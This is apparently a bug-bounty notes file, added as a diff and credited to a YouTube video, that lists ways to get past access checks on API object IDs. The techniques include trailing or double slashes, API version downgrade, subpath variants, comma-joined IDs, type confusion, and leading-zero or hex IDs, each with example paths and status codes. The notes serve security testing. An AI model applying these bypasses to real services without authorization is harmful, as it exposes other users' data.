@@ -1,0 +1,57 @@
+https://youtu.be/lfFfJTEFK4Y?si=JUqzTyeR9-T26hr8
+amrsec
+
+
+trailing slash or path normalisation
+/api/v5/id/5     --- 200 ok
+/api/v5/id/6     ---- 403 
+/api/v5/id/6/     --- 200 ok 
+put slash in end
+
+
+double slash/obufucation
+/api/v5/id/5     --- 200 ok
+/api/v5/id/6     ---- 403 
+/api/v5/id/6//   ---200 ok 
+/api/v5/id//6//  --- 200 
+/api/v5/id//6/  --200
+
+version downgrade & also ############### upgrade 
+/api/v5/id/5     --- 200 ok
+/api/v5/id/6     ---- 403 
+/api/v1/id/6     -- 200
+v1- v(n+1)
+
+subpath or endpoint variant
+/api/v5/id/5     --- 200 ok
+/api/v5/id/6     ---- 403 
+/api/v5/id/6/details or something -- 200
+fuzz with paraminer or hidden endpoints 
+
+multi id or filter param abuse
+/api/v5/id/5     --- 200 ok
+/api/v5/id/6     ---- 403 
+/api/v5/id/5,6    ---200
+/api/v5/id/5.6    --200
+/api/v5/id/6.5    --200
+/api/v5/id/6'     --200
+also try /api/v5/id?user=5,6 with all above  200 
+
+type confusion
+/api/v5/id/5     --- 200 ok
+/api/v5/id/6     ---- 403 
+/api/v5/id/6abc  -- 200 
+/api/v5/id/*6*   ---200
+/api/v5/id/+6+    --200
+may be try all symbols fuzz
+
+
+
+leading zeros / hex / other format
+/api/v5/id/5     --- 200 ok
+/api/v5/id/6     ---- 403 
+/api/v5/id/06    -- 200
+/api/v5/id/0x6   -- 200 hex format encdo
+
+
+
